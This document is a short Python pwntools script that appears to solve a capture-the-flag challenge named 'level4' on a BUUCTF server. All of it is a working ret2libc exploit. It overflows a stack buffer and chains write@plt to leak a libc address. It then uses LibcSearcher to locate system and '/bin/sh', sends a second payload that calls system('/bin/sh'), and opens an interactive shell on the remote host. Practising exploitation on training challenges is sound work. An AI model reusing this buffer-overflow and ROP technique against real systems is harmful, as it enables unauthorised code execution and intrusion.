from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
p = process('./level4')
p = remote('node5.buuoj.cn',29843)
elf = ELF('./level4')

write_plt = elf.plt['write']
write_got = elf.got['write']
vuln_addr = elf.symbols['vulnerable_function']

payload = b'b'*0x88 + b'a'*0x4
payload += p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)  
payload += p32(vuln_addr)  
p.sendline(payload)
write_addr = u32(p.recv(4))
print(hex(write_addr))

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = b'b'*0x88 + b'a'*0x4
payload += p32(system_addr) + p32(vuln_addr) + p32(binsh_addr)
p.sendline(payload)

#p.sendline(payload)
p.interactive()
